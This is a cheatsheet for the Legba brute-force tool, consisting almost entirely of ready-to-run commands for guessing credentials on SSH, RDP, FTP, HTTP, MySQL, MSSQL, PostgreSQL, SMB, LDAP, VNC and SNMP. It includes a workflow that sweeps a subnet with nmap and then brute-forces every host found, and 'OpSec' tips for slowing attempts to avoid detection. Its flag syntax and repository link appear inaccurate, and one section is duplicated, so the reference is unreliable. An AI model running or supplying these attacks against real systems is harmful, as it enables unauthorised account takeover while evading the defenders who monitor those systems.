# Legba Cheatsheet

## Quick Reference

### SSH Brute Force

```bash
# Single user, password list
legba --target 192.168.1.100 --protocol ssh --username root --passwords /usr/share/wordlists/rockyou.txt

# User list, password list
legba --target 192.168.1.100 --protocol ssh --usernames usernames.txt --passwords passwords.txt

# Custom port
legba --target 192.168.1.100 --port 2222 --protocol ssh --username admin --passwords passwords.txt
```

### RDP Brute Force

```bash
legba --target 192.168.1.100 --protocol rdp --username administrator --passwords passwords.txt
```

### FTP Brute Force

```bash
legba --target 192.168.1.100 --protocol ftp --username admin --passwords passwords.txt
```

### HTTP Brute Force

```bash
# Basic authentication
legba --target 192.168.1.100 --protocol http --username admin --passwords passwords.txt

# Form-based
legba --target 192.168.1.100 --protocol http --username admin --passwords passwords.txt --url /login.php
```

### MySQL Brute Force

```bash
legba --target 192.168.1.100 --protocol mysql --username root --passwords passwords.txt
```

### MSSQL Brute Force

```bash
legba --target 192.168.1.100 --protocol mssql --username sa --passwords passwords.txt
```

### PostgreSQL Brute Force

```bash
legba --target 192.168.1.100 --protocol postgres --username postgres --passwords passwords.txt
```

### SMB Brute Force

```bash
legba --target 192.168.1.100 --protocol smb --username administrator --passwords passwords.txt
```

### LDAP Brute Force

```bash
legba --target 192.168.1.100 --protocol ldap --username "cn=admin,dc=example,dc=com" --passwords passwords.txt
```

### VNC Brute Force

```bash
legba --target 192.168.1.100 --protocol vnc --passwords passwords.txt
```

### SNMP Brute Force

```bash
legba --target 192.168.1.100 --protocol snmp --username public --passwords passwords.txt
```

### Combo File Attack

```bash
# Create combo file (user:pass)
echo "admin:password123" > combo.txt
echo "root:toor" >> combo.txt

# Attack with combo file
legba --target 192.168.1.100 --protocol ssh --combo combo.txt
```

### Multiple Targets

```bash
# From file
legba --target-file targets.txt --protocol ssh --username root --passwords passwords.txt

# CIDR notation
legba --target 192.168.1.0/24 --protocol ssh --username root --passwords passwords.txt
```

### Rate Limiting

```bash
# Add delay between attempts
legba --target 192.168.1.100 --protocol ssh --username root --passwords passwords.txt --delay 5

# Reduce thread count
legba --target 192.168.1.100 --protocol ssh --username root --passwords passwords.txt --threads 1
```

### Session Management

```bash
# Resume interrupted session
legba --target 192.168.1.100 --protocol ssh --username root --passwords passwords.txt --resume session.json

# Save session
legba --target 192.168.1.100 --protocol ssh --username root --passwords passwords.txt --output results.json
```

### Output Formats

```bash
# JSON output
legba --target 192.168.1.100 --protocol ssh --username root --passwords passwords.txt --output results.json --format json

# Text output
legba --target 192.168.1.100 --protocol ssh --username root --passwords passwords.txt --output results.txt --format text
```

## Command Options

| Option | Description |
|--------|-------------|
| `--target` | Target host or IP |
| `--target-file` | Target list file |
| `--port` | Target port |
| `--protocol` | Protocol to attack |
| `--username` | Single username |
| `--usernames` | Username list file |
| `--password` | Single password |
| `--passwords` | Password list file |
| `--combo` | Combo file (user:pass) |
| `--threads` | Number of threads (default: 1) |
| `--timeout` | Connection timeout (default: 10s) |
| `--delay` | Delay between attempts (default: 0s) |
| `--retries` | Number of retries (default: 3) |
| `--output` | Output file |
| `--format` | Output format: text, json |
| `--resume` | Resume from previous session |
| `--verbose` | Verbose output |
| `--debug` | Debug mode |

## Supported Protocols

| Protocol | Default Port |
|----------|--------------|
| SSH | 22 |
| RDP | 3389 |
| FTP | 21 |
| Telnet | 23 |
| HTTP | 80 |
| HTTPS | 443 |
| MySQL | 3306 |
| MSSQL | 1433 |
| PostgreSQL | 5432 |
| SMB | 445 |
| VNC | 5900 |
| LDAP | 389 |
| SNMP | 161 |
| SMTP | 25 |
| POP3 | 110 |
| IMAP | 143 |

## Common Workflows

### Discover and Attack

```bash
# 1. Find services
nmap -p 22,80,445,3306,3389 --open 192.168.1.0/24 -oG - > services.txt

# 2. Extract targets per service
grep "22/open" services.txt | awk '{print $2}' > ssh_hosts.txt

# 3. Brute force
for host in $(cat ssh_hosts.txt); do
    legba --target $host --protocol ssh --username root --passwords passwords.txt
done
```

### Combo File Attack

```bash
# Create combo file
echo "admin:password123" > combo.txt
echo "root:toor" >> combo.txt

# Attack with combo file
legba --target 192.168.1.100 --protocol ssh --combo combo.txt
```

### Multi-Service Attack

```bash
legba --target 192.168.1.100 --protocol ssh --username root --passwords passwords.txt &
legba --target 192.168.1.100 --protocol ftp --username admin --passwords passwords.txt &
wait
```

## Troubleshooting

### Common Errors

**"Connection refused"**:
```bash
nmap -p 22 192.168.1.100
ssh root@192.168.1.100
```

**"No credentials found"**:
```bash
legba --target 192.168.1.100 --protocol ssh --username root --passwords /usr/share/wordlists/rockyou.txt --delay 10
```

**"Too many connections"**:
```bash
legba --target 192.168.1.100 --protocol ssh --username root --passwords passwords.txt --threads 1 --delay 5
```

## OpSec Tips

1. **Reduce threads**: Use `--threads 1` for stealth
2. **Add delay**: Use `--delay 10` to slow down attempts
3. **Log everything**: Use `--output` for audit trail
4. **Use combo files**: Combine usernames and passwords for targeted attacks

## Resources

- **GitHub**: https://github.com/ctxii/legba
- **Kali Docs**: https://www.kali.org/tools/legba/
